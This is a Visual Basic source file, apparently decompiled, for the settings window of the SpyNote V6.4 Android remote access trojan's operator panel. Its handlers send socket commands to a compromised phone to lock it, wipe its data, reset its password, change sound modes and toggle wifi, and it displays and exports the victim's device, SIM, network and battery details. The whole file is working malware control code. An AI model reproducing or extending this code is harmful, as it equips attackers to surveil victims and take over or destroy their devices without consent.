Imports Microsoft.VisualBasic.CompilerServices
Imports System.Runtime.CompilerServices
Imports System.Text
Imports SpyNote_V6._4.SN
Imports SpyNote_V6._4.SN.SpyNote.Stores
Imports SpyNote_V6._4.SN.Sockets.SpyNote.Client

Public Class FSettings
    Public TClient As SocketClient

    Private sj As Bitmap

    Private x As Integer

    Private y As Integer
    Public Sub New()
        Me.sj = New Bitmap(24, 24)
        Me.InitializeComponent()
    End Sub

    Private Sub BRNresetPassword_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BRNresetPassword.Click
        Dim _restPass As restPass = New restPass()
        If (_restPass.ShowDialog(Me) = System.Windows.Forms.DialogResult.OK) Then
            Try
                Dim str As String = _restPass.aPass.Text.Trim()
                If (Operators.CompareString(str, "", False) <> 0) Then
                    Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(59)), Data.SplitData, "2", Data.SplitData, str}))
                End If
                _restPass.Close()
            Catch exception As System.Exception
                _restPass.Close()
            End Try
        Else
            _restPass.Close()
        End If
    End Sub

    Private Sub BtnBarNormal_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BtnBarNormal.Click
        Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(49)), Data.SplitData, "-1", Data.SplitData, Conversions.ToString(Me.TrackMedia.Value), Data.SplitData, "0"}))
    End Sub

    Private Sub BtnBarSilent_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BtnBarSilent.Click
        Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(49)), Data.SplitData, "-1", Data.SplitData, Conversions.ToString(Me.TrackMedia.Value), Data.SplitData, "2"}))
    End Sub

    Private Sub BtnBarVibrate_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BtnBarVibrate.Click
        Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(49)), Data.SplitData, "-1", Data.SplitData, Conversions.ToString(Me.TrackMedia.Value), Data.SplitData, "1"}))
    End Sub

    Private Sub BtnBarWifiConnected_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BtnBarWifiConnected.Click
        Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(49)), Data.SplitData, "-1", Data.SplitData, Conversions.ToString(Me.TrackMedia.Value), Data.SplitData, "3"}))
    End Sub

    Private Sub BtnBarWifiDisconnect_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BtnBarWifiDisconnect.Click
        Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(49)), Data.SplitData, "-1", Data.SplitData, Conversions.ToString(Me.TrackMedia.Value), Data.SplitData, "4"}))
    End Sub

    Private Sub BtnBarWifirest_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BtnBarWifirest.Click
        Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(49)), Data.SplitData, "-1", Data.SplitData, Conversions.ToString(Me.TrackMedia.Value), Data.SplitData, "5"}))
    End Sub

    Private Sub BTNlockNow_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BTNlockNow.Click
        Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(59)), Data.SplitData, "1", Data.SplitData, "null"}))
    End Sub

    Private Sub BtnOK_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BtnOK.Click
        Me.TClient.Send(String.Concat(Store.BFF(Store.buff, CLng(48)), Data.SplitData))
    End Sub

    Private Sub BTNwipeData_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BTNwipeData.Click
        Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(59)), Data.SplitData, "0", Data.SplitData, "null"}))
    End Sub
    Private Sub FSettings_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
        MyBase.Icon = New System.Drawing.Icon(String.Concat(Store.Resources(1), "\Icons\window\win\9.ico"))
        Me.ViewManager.ContextMenuStrip = ContextGriedView.ContextMenuContextGriedView
        Me.BTNlockNow.ImageChoice = Store.Bitmap_0("DPM\l")
        Me.BTNlockNow.ShowImage = True
        Me.BTNwipeData.ImageChoice = Store.Bitmap_0("DPM\f")
        Me.BTNwipeData.ShowImage = True
        Me.BRNresetPassword.ImageChoice = Store.Bitmap_0("DPM\p")
        Me.BRNresetPassword.ShowImage = True
        Me.BtnBarNormal.ImageChoice = Store.Bitmap_0("Bar\normal")
        Me.BtnBarNormal.ShowImage = True
        Me.BtnBarVibrate.ImageChoice = Store.Bitmap_0("Bar\vibrate")
        Me.BtnBarVibrate.ShowImage = True
        Me.BtnBarSilent.ImageChoice = Store.Bitmap_0("Bar\silent")
        Me.BtnBarSilent.ShowImage = True
        Me.BtnBarBluetooth.ImageChoice = Store.Bitmap_0("Bar\bluetooth")
        Me.BtnBarBluetooth.ShowImage = True
        Me.BtnBarGps.ImageChoice = Store.Bitmap_0("Bar\gps")
        Me.BtnBarGps.ShowImage = True
        Me.BtnBarMobileData.ImageChoice = Store.Bitmap_0("Bar\mobile_data")
        Me.BtnBarMobileData.ShowImage = True
        Me.BtnBarWifiConnected.ImageChoice = Store.Bitmap_0("Bar\wifi_connected")
        Me.BtnBarWifiConnected.ShowImage = True
        Me.BtnBarWifiDisconnect.ImageChoice = Store.Bitmap_0("Bar\wifi_disconnected")
        Me.BtnBarWifiDisconnect.ShowImage = True
        Me.BtnBarWifirest.ImageChoice = Store.Bitmap_0("Bar\wifi_rest")
        Me.BtnBarWifirest.ShowImage = True
        Me.TScrolls.Interval = Store.TScrollsInterval
        Me.TProgressBar.Interval = Store.TProgressBarInterval
        Me.TProgressBar.Enabled = True
        Me.TScrolls.Enabled = True
        Me.Trans.Interval = Store.transparency
        Me.Trans.Enabled = True
    End Sub

    Private Sub GridViewoVerticalScrollBar0()
        Dim columnsWidth As Integer = Me.ViewManager.Columns.GetColumnsWidth(DataGridViewElementStates.Visible)
        Dim flag As Boolean = columnsWidth >= Me.ViewManager.Width
        If flag Then
            Me.VisualStudioHorizontalScrollBar1.Maximum = columnsWidth - Me.ViewManager.Width
        Else
            Me.VisualStudioHorizontalScrollBar1.Maximum = columnsWidth
        End If
        Dim flag2 As Boolean = columnsWidth > Me.ViewManager.Width
        If flag2 Then
            Dim flag3 As Boolean = Not Me.VisualStudioHorizontalScrollBar1.Visible
            If flag3 Then
                Me.VisualStudioHorizontalScrollBar1.Visible = True
            End If
        Else
            Dim flag4 As Boolean = Me.VisualStudioHorizontalScrollBar1.Visible > False
            If flag4 Then
                Me.VisualStudioHorizontalScrollBar1.Visible = False
            End If
        End If
        Dim flag5 As Boolean = Me.ViewManager.Rows.Count > 0
        If flag5 Then
            Dim num As Integer = Me.ViewManager.Rows.Count * Me.ViewManager.Rows(0).Height
            Dim flag6 As Boolean = num > Me.ViewManager.Height
            If flag6 Then
                Dim flag7 As Boolean = Not Me.VisualStudioVerticalScrollBar1.Visible
                If flag7 Then
                    Me.VisualStudioVerticalScrollBar1.Visible = True
                End If
            Else
                Dim flag8 As Boolean = Me.VisualStudioVerticalScrollBar1.Visible > False
                If flag8 Then
                    Me.VisualStudioVerticalScrollBar1.Visible = False
                End If
            End If
        Else
            Dim flag9 As Boolean = Me.VisualStudioVerticalScrollBar1.Visible > False
            If flag9 Then
                Me.VisualStudioVerticalScrollBar1.Visible = False
            End If
        End If
    End Sub
    Private Sub RefScrolls()
        Dim num As Integer = 0
        If (MyBase.Visible) Then
            SyncLock Me.ViewManager
                If (Me.ViewManager.Rows.Count > 0) Then
                    If (Me.ViewManager.Rows.Count * Me.ViewManager.Rows(0).Height > Me.ViewManager.Height) Then
                        num = CInt(Math.Round(CDbl(Me.ViewManager.Height) / CDbl(Me.ViewManager.Rows(0).Height))) - 2
                        If (num < 0) Then
                            num = 0
                        End If
                    End If
                End If
                Me.VisualStudioVerticalScrollBar1.Maximum = Me.ViewManager.Rows.Count - num
                Me.GridViewoVerticalScrollBar0()
            End SyncLock
        End If
    End Sub

    Private Sub refvalues()
        Me.LabelRingtone.Text = String.Concat("Ringtone ", Conversions.ToString(Me.TrackRingtone.Value), " of ", Conversions.ToString(Me.TrackRingtone.Maximum))
        Me.LabelMedia.Text = String.Concat("Media ", Conversions.ToString(Me.TrackMedia.Value), " of ", Conversions.ToString(Me.TrackMedia.Maximum))
        Me.LabelNotification.Text = String.Concat("Notification ", Conversions.ToString(Me.TrackNotification.Value), " of ", Conversions.ToString(Me.TrackNotification.Maximum))
        Me.LabelSystem.Text = String.Concat("System ", Conversions.ToString(Me.TrackSystem.Value), " of ", Conversions.ToString(Me.TrackSystem.Maximum))
    End Sub

    Public Sub TData(ByVal Ay As Array)
        Dim enumerator As IEnumerator = Nothing
        Try
            Dim value As String = CStr(Ay.GetValue(0))
            If (Operators.CompareString(value, Store.BFF(Store.buff, CLng(83)), False) <> 0) Then
                If (Operators.CompareString(value, Store.BFF(Store.buff, CLng(84)), False) = 0) Then
                    Me.ViewManager.Rows.Clear()
                    Dim stringBuilder As System.Text.StringBuilder = New System.Text.StringBuilder()
                    stringBuilder.Append(String.Concat("<title>Spy Note - ", MyBase.Name, "</title>"))
                    Dim stringBuilder1 As System.Text.StringBuilder = New System.Text.StringBuilder()
                    stringBuilder1.Append(String.Concat("</tr><th>", Me.ViewManager.Columns(1).HeaderText, "</th><tr>"))
                    Dim stringBuilder2 As System.Text.StringBuilder = New System.Text.StringBuilder()
                    Dim strArrays As String() = CStr(Ay.GetValue(1)).Split(New String() {Data.SplitLines}, StringSplitOptions.RemoveEmptyEntries)
                    Dim strArrays1 As String() = strArrays(0).Split(New String() {Data.SplitArray}, StringSplitOptions.RemoveEmptyEntries)
                    Dim num As Integer = 0
                    Dim length As Integer = CInt(strArrays1.Length) - 1
                    Dim num1 As Integer = 0
                    Do
                        Dim str As String = strArrays1(num1)
                        If (Not (str.StartsWith("[") And str.EndsWith("]"))) Then
                            Select Case num
                                Case 1
                                    Me.sj = New Bitmap(Store.Bitmap_0("pinf\device"))
                                    Me.ViewManager.Rows.Add(New Object() {Me.sj, str})
                                    Exit Select
                                Case 2
                                    Me.sj = New Bitmap(Store.Bitmap_0("pinf\system"))
                                    Me.ViewManager.Rows.Add(New Object() {Me.sj, str})
                                    Exit Select
                                Case 3
                                    Me.sj = New Bitmap(Store.Bitmap_0("pinf\sim"))
                                    Me.ViewManager.Rows.Add(New Object() {Me.sj, str})
                                    Exit Select
                                Case 4
                                    Me.sj = New Bitmap(Store.Bitmap_0("pinf\wifi"))
                                    Me.ViewManager.Rows.Add(New Object() {Me.sj, str})
                                    Exit Select
                                Case 5
                                    Me.sj = New Bitmap(Store.Bitmap_0("pinf\battery"))
                                    Me.ViewManager.Rows.Add(New Object() {Me.sj, str})
                                    Exit Select
                            End Select
                        Else
                            Me.sj = New Bitmap(24, 24)
                            Me.ViewManager.Rows.Add(New Object() {Me.sj, str})
                            Dim color As System.Drawing.Color = System.Drawing.Color.FromArgb(63, 63, 70)
                            Dim color1 As System.Drawing.Color = System.Drawing.Color.FromArgb(255, 255, 255)
                            Me.ViewManager.Rows(Me.ViewManager.RowCount - 1).Cells(1).Style.BackColor = color
                            Me.ViewManager.Rows(Me.ViewManager.RowCount - 1).Cells(0).Style.BackColor = color
                            Me.ViewManager.Rows(Me.ViewManager.RowCount - 1).Cells(0).Style.SelectionBackColor = color
                            Me.ViewManager.Rows(Me.ViewManager.RowCount - 1).Cells(1).Style.SelectionBackColor = color
                            Me.ViewManager.Rows(Me.ViewManager.RowCount - 1).Cells(1).Style.SelectionForeColor = color1
                            Me.ViewManager.Rows(Me.ViewManager.RowCount - 1).Cells(1).Style.ForeColor = color1
                            Me.ViewManager.Rows(Me.ViewManager.RowCount - 1).DefaultCellStyle.Alignment = DataGridViewContentAlignment.MiddleCenter
                            num = num + 1
                        End If
                        stringBuilder2.Append(String.Concat("</tr> <td>", str, "</td><tr>" & vbCrLf & ""))
                        num1 = num1 + 1
                    Loop While num1 <= length
                    num = 0
                    If (stringBuilder2.Length > 0) Then
                        Store.StartThread(DirectCast((New Object() {stringBuilder, stringBuilder1, stringBuilder2, String.Concat(Me.TClient.ClientName, "_", Me.TClient.ClientImei), "Settings"}), Array))
                    End If
                    Dim strArrays2 As String() = strArrays(1).Split(New String() {Data.SplitArray}, StringSplitOptions.RemoveEmptyEntries)
                    Me.LabelRingtone.Text = String.Concat("Ringtone ", strArrays2(1).Trim(), " of ", strArrays2(0).Trim())
                    Me.TrackRingtone.Maximum = Conversions.ToInteger(strArrays2(0).Trim())
                    Me.TrackRingtone.Value = Conversions.ToInteger(strArrays2(1).Trim())
                    Me.LabelMedia.Text = String.Concat("Media ", strArrays2(3).Trim(), " of ", strArrays2(2).Trim())
                    Me.TrackMedia.Maximum = Conversions.ToInteger(strArrays2(2).Trim())
                    Me.TrackMedia.Value = Conversions.ToInteger(strArrays2(3).Trim())
                    Me.LabelNotification.Text = String.Concat("Notification ", strArrays2(5).Trim(), " of ", strArrays2(4).Trim())
                    Me.TrackNotification.Maximum = Conversions.ToInteger(strArrays2(4).Trim())
                    Me.TrackNotification.Value = Conversions.ToInteger(strArrays2(5).Trim())
                    Me.LabelSystem.Text = String.Concat("System ", strArrays2(7).Trim(), " of ", strArrays2(6).Trim())
                    Me.TrackSystem.Maximum = Conversions.ToInteger(strArrays2(6).Trim())
                    Me.TrackSystem.Value = Conversions.ToInteger(strArrays2(7).Trim())
                    Dim strArrays3 As String() = strArrays(2).Split(New String() {Data.SplitArray}, StringSplitOptions.RemoveEmptyEntries)
                    If (Operators.CompareString(strArrays3(0), "-1", False) = 0) Then
                        Me.BtnBarNormal.Enabled = False
                    ElseIf (Operators.CompareString(strArrays3(0), "True", False) <> 0) Then
                        Me.BtnBarNormal.CLRNonebrd = System.Drawing.Color.FromArgb(85, 85, 85)
                        Me.BtnBarNormal.CLROverbrd = System.Drawing.Color.FromArgb(85, 85, 85)
                    Else
                        Me.BtnBarNormal.CLRNonebrd = System.Drawing.Color.FromArgb(32, 146, 255)
                        Me.BtnBarNormal.CLROverbrd = System.Drawing.Color.FromArgb(32, 146, 255)
                    End If
                    Me.BtnBarNormal.Refresh()
                    If (Operators.CompareString(strArrays3(1), "-1", False) = 0) Then
                        Me.BtnBarVibrate.Enabled = False
                    ElseIf (Operators.CompareString(strArrays3(1), "True", False) <> 0) Then
                        Me.BtnBarVibrate.CLRNonebrd = System.Drawing.Color.FromArgb(85, 85, 85)
                        Me.BtnBarVibrate.CLROverbrd = System.Drawing.Color.FromArgb(85, 85, 85)
                    Else
                        Me.BtnBarVibrate.CLRNonebrd = System.Drawing.Color.FromArgb(32, 146, 255)
                        Me.BtnBarVibrate.CLROverbrd = System.Drawing.Color.FromArgb(32, 146, 255)
                    End If
                    Me.BtnBarVibrate.Refresh()
                    If (Operators.CompareString(strArrays3(2), "-1", False) = 0) Then
                        Me.BtnBarSilent.Enabled = False
                    ElseIf (Operators.CompareString(strArrays3(2), "True", False) <> 0) Then
                        Me.BtnBarSilent.CLRNonebrd = System.Drawing.Color.FromArgb(85, 85, 85)
                        Me.BtnBarSilent.CLROverbrd = System.Drawing.Color.FromArgb(85, 85, 85)
                    Else
                        Me.BtnBarSilent.CLRNonebrd = System.Drawing.Color.FromArgb(32, 146, 255)
                        Me.BtnBarSilent.CLROverbrd = System.Drawing.Color.FromArgb(32, 146, 255)
                    End If
                    Me.BtnBarSilent.Refresh()
                    If (Operators.CompareString(strArrays3(3), "-1", False) = 0) Then
                        Me.BtnBarBluetooth.Enabled = False
                    ElseIf (Operators.CompareString(strArrays3(3), "True", False) <> 0) Then
                        Me.BtnBarBluetooth.CLRNonebrd = System.Drawing.Color.FromArgb(85, 85, 85)
                        Me.BtnBarBluetooth.CLROverbrd = System.Drawing.Color.FromArgb(85, 85, 85)
                    Else
                        Me.BtnBarBluetooth.CLRNonebrd = System.Drawing.Color.FromArgb(32, 146, 255)
                        Me.BtnBarBluetooth.CLROverbrd = System.Drawing.Color.FromArgb(32, 146, 255)
                    End If
                    Me.BtnBarBluetooth.Refresh()
                    If (Operators.CompareString(strArrays3(4), "-1", False) = 0) Then
                        Me.BtnBarGps.Enabled = False
                    ElseIf (Operators.CompareString(strArrays3(4), "True", False) <> 0) Then
                        Me.BtnBarGps.CLRNonebrd = System.Drawing.Color.FromArgb(85, 85, 85)
                        Me.BtnBarGps.CLROverbrd = System.Drawing.Color.FromArgb(85, 85, 85)
                    Else
                        Me.BtnBarGps.CLRNonebrd = System.Drawing.Color.FromArgb(32, 146, 255)
                        Me.BtnBarGps.CLROverbrd = System.Drawing.Color.FromArgb(32, 146, 255)
                    End If
                    Me.BtnBarGps.Refresh()
                    If (Operators.CompareString(strArrays3(5), "-1", False) = 0) Then
                        Me.BtnBarMobileData.Enabled = False
                    ElseIf (Operators.CompareString(strArrays3(5), "True", False) <> 0) Then
                        Me.BtnBarMobileData.CLRNonebrd = System.Drawing.Color.FromArgb(85, 85, 85)
                        Me.BtnBarMobileData.CLROverbrd = System.Drawing.Color.FromArgb(85, 85, 85)
                    Else
                        Me.BtnBarMobileData.CLRNonebrd = System.Drawing.Color.FromArgb(32, 146, 255)
                        Me.BtnBarMobileData.CLROverbrd = System.Drawing.Color.FromArgb(32, 146, 255)
                    End If
                    Me.BtnBarMobileData.Refresh()
                    If (Operators.CompareString(strArrays3(6), "-1", False) = 0) Then
                        Me.BtnBarWifiConnected.Enabled = False
                    ElseIf (Operators.CompareString(strArrays3(6), "True", False) <> 0) Then
                        Me.BtnBarWifiConnected.CLRNonebrd = System.Drawing.Color.FromArgb(85, 85, 85)
                        Me.BtnBarWifiConnected.CLROverbrd = System.Drawing.Color.FromArgb(85, 85, 85)
                    Else
                        Me.BtnBarWifiConnected.CLRNonebrd = System.Drawing.Color.FromArgb(32, 146, 255)
                        Me.BtnBarWifiConnected.CLROverbrd = System.Drawing.Color.FromArgb(32, 146, 255)
                    End If
                    Me.BtnBarWifiConnected.Refresh()
                    If (Operators.CompareString(strArrays3(7), "-1", False) = 0) Then
                        Me.BtnBarWifiDisconnect.Enabled = False
                    ElseIf (Operators.CompareString(strArrays3(7), "True", False) <> 0) Then
                        Me.BtnBarWifiDisconnect.CLRNonebrd = System.Drawing.Color.FromArgb(85, 85, 85)
                        Me.BtnBarWifiDisconnect.CLROverbrd = System.Drawing.Color.FromArgb(85, 85, 85)
                    Else
                        Me.BtnBarWifiDisconnect.CLRNonebrd = System.Drawing.Color.FromArgb(32, 146, 255)
                        Me.BtnBarWifiDisconnect.CLROverbrd = System.Drawing.Color.FromArgb(32, 146, 255)
                    End If
                    Me.BtnBarWifiDisconnect.Refresh()
                    If (Operators.CompareString(strArrays3(8), "True", False) <> 0) Then
                        Try
                            enumerator = Me.ThemeTabControl1.TabPages.GetEnumerator()
                            While enumerator.MoveNext()
                                Dim objectValue As Object = RuntimeHelpers.GetObjectValue(enumerator.Current)
                                If (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(objectValue, Nothing, "name", New Object(-1) {}, Nothing, Nothing, Nothing), "TabPage4", False)) Then
                                    Me.ThemeTabControl1.TabPages.Remove(DirectCast(objectValue, TabPage))
                                End If
                            End While
                        Finally
                        End Try
                    ElseIf (Not Me.ThemeTabControl1.TabPages.Contains(Me.TabPage4)) Then
                        Me.ThemeTabControl1.TabPages.Insert(0, Me.TabPage4)
                    End If
                End If
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub TProgressBar_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles TProgressBar.Tick
        If (Me.TClient Is Nothing) Then
            Me.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(MyBase.Tag, Strings.Space(1)), "-> Connection Lost ..."))
            If (Me.ProgressBar1.Value <> 100) Then
                Me.ProgressBar1.Value = 100
                If (Me.ProgressBar1.Colour1 = Color.FromArgb(140, 140, 140)) Then
                    Me.ProgressBar1.Colour0 = Color.FromArgb(128, 128, 128)
                    Me.ProgressBar1.Colour1 = Color.FromArgb(88, 88, 88)
                End If
            End If
        ElseIf (Not Me.TClient.IsClose) Then
            If (Me.Text <> MyBase.Tag) Then
                Me.Text = Conversions.ToString(MyBase.Tag)
            End If
            If (Me.ProgressBar1.Colour1 <> Color.FromArgb(140, 140, 140)) Then
                Me.ProgressBar1.Colour1 = Color.FromArgb(140, 140, 140)
                Me.ProgressBar1.Colour0 = Color.FromArgb(140, 140, 140)
            End If
            Me.ProgressBar1.Value = Me.TClient.mProgressBar(Store.BFF(Store.buff, CLng(48)), Store.BFF(Store.buff, CLng(49)))
        Else
            Me.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(MyBase.Tag, Strings.Space(1)), "-> Connection Lost ..."))
            If (Me.ProgressBar1.Value <> 100) Then
                Me.ProgressBar1.Value = 100
                If (Me.ProgressBar1.Colour1 = Color.FromArgb(140, 140, 140)) Then
                    Me.ProgressBar1.Colour0 = Color.FromArgb(128, 128, 128)
                    Me.ProgressBar1.Colour1 = Color.FromArgb(88, 88, 88)
                End If
            End If
        End If
    End Sub

    Private Sub TrackMedia_MouseClick(ByVal sender As Object, ByVal e As MouseEventArgs) Handles TrackMedia.MouseClick
        Try
            Dim trackMedia As Track = Me.TrackMedia
            Dim x As Double = CDbl(e.Location.X)
            Dim size As System.Drawing.Size = Me.TrackMedia.Size
            trackMedia.Value = CInt(Math.Round(x / CDbl(size.Width) * CDbl(Me.TrackMedia.Maximum)))
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub TrackMedia_MouseUp(ByVal sender As Object, ByVal e As MouseEventArgs) Handles TrackMedia.MouseUp
        Me.refvalues()
        Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(49)), Data.SplitData, "1", Data.SplitData, Conversions.ToString(Me.TrackMedia.Value), Data.SplitData, "-1"}))
    End Sub

    Private Sub TrackMedia_ValueChanged()
        Me.refvalues()
    End Sub

    Private Sub TrackNotification_MouseClick(ByVal sender As Object, ByVal e As MouseEventArgs) Handles TrackNotification.MouseClick
        Try
            Dim trackNotification As Track = Me.TrackNotification
            Dim x As Double = CDbl(e.Location.X)
            Dim size As System.Drawing.Size = Me.TrackNotification.Size
            trackNotification.Value = CInt(Math.Round(x / CDbl(size.Width) * CDbl(Me.TrackNotification.Maximum)))
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub TrackNotification_MouseUp(ByVal sender As Object, ByVal e As MouseEventArgs) Handles TrackNotification.MouseUp
        Me.refvalues()
        Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(49)), Data.SplitData, "2", Data.SplitData, Conversions.ToString(Me.TrackNotification.Value), Data.SplitData, "-1"}))
    End Sub

    Private Sub TrackNotification_ValueChanged()
        Me.refvalues()
    End Sub

    Private Sub TrackRingtone_MouseClick(ByVal sender As Object, ByVal e As MouseEventArgs) Handles TrackRingtone.MouseClick
        Try
            Dim trackRingtone As Track = Me.TrackRingtone
            Dim x As Double = CDbl(e.Location.X)
            Dim size As System.Drawing.Size = Me.TrackRingtone.Size
            trackRingtone.Value = CInt(Math.Round(x / CDbl(size.Width) * CDbl(Me.TrackRingtone.Maximum)))
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub TrackRingtone_MouseUp(ByVal sender As Object, ByVal e As MouseEventArgs) Handles TrackRingtone.MouseUp
        Me.refvalues()
        Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(49)), Data.SplitData, "0", Data.SplitData, Conversions.ToString(Me.TrackRingtone.Value), Data.SplitData, "-1"}))
    End Sub

    Private Sub TrackRingtone_ValueChanged()
        Me.refvalues()
    End Sub

    Private Sub TrackSystem_MouseClick(ByVal sender As Object, ByVal e As MouseEventArgs) Handles TrackSystem.MouseClick
        Try
            Dim trackSystem As Track = Me.TrackSystem
            Dim x As Double = CDbl(e.Location.X)
            Dim size As System.Drawing.Size = Me.TrackSystem.Size
            trackSystem.Value = CInt(Math.Round(x / CDbl(size.Width) * CDbl(Me.TrackSystem.Maximum)))
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub TrackSystem_MouseUp(ByVal sender As Object, ByVal e As MouseEventArgs) Handles TrackSystem.MouseUp
        Me.refvalues()
        Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(49)), Data.SplitData, "3", Data.SplitData, Conversions.ToString(Me.TrackSystem.Value), Data.SplitData, "-1"}))
    End Sub

    Private Sub TrackSystem_ValueChanged()
        Me.refvalues()
    End Sub

    Private Sub Trans_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Trans.Tick
        If (MyBase.Opacity = 1) Then
            Me.Trans.Enabled = False
        Else
            MyBase.Opacity = MyBase.Opacity + 0.1
        End If
    End Sub

    Private Sub TScrolls_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles TScrolls.Tick
        Me.RefScrolls()
    End Sub

    Private Sub ViewManager_CellMouseClick(ByVal sender As Object, ByVal e As DataGridViewCellMouseEventArgs) Handles ViewManager.CellMouseClick
        If (e.RowIndex <> -1) Then
            Me.VisualStudioVerticalScrollBar1.Llen = If(e.RowIndex >= Me.VisualStudioVerticalScrollBar1.Maximum, Me.VisualStudioVerticalScrollBar1.Maximum, e.RowIndex)
        End If
    End Sub

    Private Sub ViewManager_MouseWheel(ByVal sender As Object, ByVal e As MouseEventArgs) Handles ViewManager.MouseWheel
        If (e.Delta <= 1) Then
            Dim visualStudioVerticalScrollBar1 As VisualStudioVerticalScrollBar = Me.VisualStudioVerticalScrollBar1
            visualStudioVerticalScrollBar1.Value = visualStudioVerticalScrollBar1.Value + 1
        Else
            Dim value As VisualStudioVerticalScrollBar = Me.VisualStudioVerticalScrollBar1
            value.Value = value.Value - 1
        End If
    End Sub

    Private Sub ViewManager_RowStateChanged(ByVal sender As Object, ByVal e As DataGridViewRowStateChangedEventArgs) Handles ViewManager.RowStateChanged
        If (e.StateChanged = DataGridViewElementStates.Selected) Then
            Me.VisualStudioVerticalScrollBar1.Llen = If(e.Row.Index >= Me.VisualStudioVerticalScrollBar1.Maximum, Me.VisualStudioVerticalScrollBar1.Maximum, e.Row.Index)
        End If
    End Sub

    Private Sub ViewManager_Scroll(ByVal sender As Object, ByVal e As ScrollEventArgs) Handles ViewManager.Scroll
        If (e.ScrollOrientation <> ScrollOrientation.HorizontalScroll) Then
            Me.y = e.NewValue
            Me.VisualStudioVerticalScrollBar1.Value = Me.y
        Else
            Me.x = e.NewValue
            Me.VisualStudioHorizontalScrollBar1.Value = Me.x
        End If
    End Sub

    Private Sub ViewManager_Sorted(ByVal sender As Object, ByVal e As EventArgs) Handles ViewManager.Sorted
        Me.VisualStudioVerticalScrollBar1.Llen = -1
    End Sub

    Private Sub VisualStudioHorizontalScrollBar1_Scroll_1(ByVal sender As Object) Handles VisualStudioHorizontalScrollBar1.Scroll
        Try
            If (Me.ViewManager.HorizontalScrollingOffset <> -1) Then
                Me.ViewManager.HorizontalScrollingOffset = Me.VisualStudioHorizontalScrollBar1.Value
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub VisualStudioVerticalScrollBar1_Scroll_1(ByVal sender As Object) Handles VisualStudioVerticalScrollBar1.Scroll
        Try
            If (Me.ViewManager.FirstDisplayedScrollingRowIndex <> -1) Then
                Me.ViewManager.FirstDisplayedScrollingRowIndex = Me.VisualStudioVerticalScrollBar1.Value
            End If
        Catch exception As System.Exception
            If (Me.ViewManager.FirstDisplayedScrollingRowIndex >= 0) Then
                Me.ViewManager.FirstDisplayedScrollingRowIndex = Me.ViewManager.RowCount - 1
            End If
        End Try
    End Sub
End Class